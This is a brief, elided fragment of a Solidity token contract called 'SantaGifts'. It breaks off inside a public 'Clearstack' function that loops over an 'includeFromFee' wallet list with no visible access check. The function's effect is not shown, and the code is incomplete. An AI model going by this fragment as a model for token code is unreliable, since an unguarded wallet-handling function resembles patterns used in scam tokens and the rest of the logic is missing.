...
contract SantaGifts is Context, IERC20, Ownable {
    ...
    string private constant _name = "SantaGifts";
    string private constant _symbol = "SantaGifts";
    ...
    function Clearstack() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i];
